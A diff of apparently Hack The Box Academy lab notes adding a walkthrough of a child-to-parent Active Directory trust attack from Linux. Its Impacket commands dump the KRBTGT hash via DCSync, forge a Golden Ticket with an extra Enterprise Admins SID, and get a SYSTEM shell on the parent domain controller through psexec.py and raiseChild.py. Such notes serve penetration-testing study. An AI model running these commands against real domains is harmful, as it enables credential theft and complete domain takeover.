@@ -2896,6 +2896,7 @@ C:\htb> netdom query /domain:inlanefreight.local workstation
 
 By understanding and carefully managing domain trusts, organizations can improve their security posture and reduce the risk of attacks exploiting these trust relationships.
 
+---
 
 # Attacking Domain Trusts - Child -> Parent Trusts - from Windows
 
@@ -2999,3 +3000,103 @@ PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 **Notes:**
 - The Rubeus command `/rc4` flag is the NT hash for the KRBTGT account.
 - The `/sids` flag will tell Rubeus to create a Golden Ticket granting the same rights as members of the Enterprise Admins group in the parent domain.
+
+---
+
+# Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+
+**Objective:** Perform the Golden Ticket attack from a Linux attack host after compromising a child domain. The goal is to escalate privileges from the compromised child domain to the parent domain by leveraging SID history and Kerberos authentication.
+
+### Data Needed
+1. **KRBTGT hash** for the child domain
+2. **SID** for the child domain
+3. **Target user name** in the child domain (can be fake)
+4. **FQDN** of the child domain
+5. **SID of the Enterprise Admins group** in the root domain
+
+### Steps to Perform the Attack
+
+1. **Perform DCSync with secretsdump.py**
+   - **Purpose:** To obtain the NTLM hash for the KRBTGT account in the child domain.
+   - **Command:**
+     ```bash
+     secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+     ```
+   - **Explanation:** `secretsdump.py` is used to extract the KRBTGT hash by performing a DCSync attack, which simulates the behavior of a domain controller to replicate data.
+
+2. **Perform SID Brute Forcing using lookupsid.py**
+   - **Purpose:** To find the SID of the child domain by enumerating user and group SIDs.
+   - **Command:**
+     ```bash
+     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+     ```
+
+3. **Filter for the Domain SID**
+   - **Purpose:** To extract only the domain SID from the output of the previous command.
+   - **Command:**
+     ```bash
+     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+     ```
+
+4. **Get the Domain SID & Attach Enterprise Admin's RID**
+   - **Purpose:** To obtain the SID for the Enterprise Admins group in the parent domain.
+   - **Command:**
+     ```bash
+     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+     ```
+
+### Constructing a Golden Ticket
+
+5. **Construct a Golden Ticket using ticketer.py**
+   - **Purpose:** To create a Golden Ticket that grants administrative access across both the child and parent domains.
+   - **Command:**
+     ```bash
+     ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+     ```
+   - **Explanation:** `ticketer.py` generates a Kerberos TGT (Ticket Granting Ticket) for the specified user with the necessary privileges.
+
+6. **Set the KRB5CCNAME Environment Variable**
+   - **Purpose:** To use the generated ccache file for Kerberos authentication.
+   - **Command:**
+     ```bash
+     export KRB5CCNAME=hacker.ccache
+     ```
+   - **Explanation:** Setting the `KRB5CCNAME` environment variable tells the system to use the specified ccache file for authentication attempts.
+
+### Authenticating to the Parent Domain
+
+7. **Authenticate using Impacket's version of Psexec**
+   - **Purpose:** To verify access by attempting to execute commands on the parent domain's Domain Controller.
+   - **Command:**
+     ```bash
+     psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+     ```
+   - **Example Output:**
+     ```bash
+     C:\Windows\system32> whoami
+     nt authority\system
+
+     C:\Windows\system32> hostname
+     ACADEMY-EA-DC01
+     ```
+
+### Using raiseChild.py for Automation
+
+8. **Perform the Attack with raiseChild.py**
+   - **Purpose:** To automate the escalation process from the child domain to the parent domain.
+   - **Command:**
+     ```bash
+     raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+     ```
+   - **Example Output:**
+     ```bash
+     C:\Windows\system32>whoami
+     nt authority\system
+
+     C:\Windows\system32>exit
+     ```
+
+### Notes on Using Automation Tools
+- **Understand the Manual Process**: Always understand the manual process of gathering required data points.
+- **Use Automation Tools with Caution**: Be cautious when using automation tools in a client production environment to avoid unexpected issues.
+- **Avoid Blindly Using "Autopwn" Scripts**: Work with tools you fully understand to maintain control over the process.
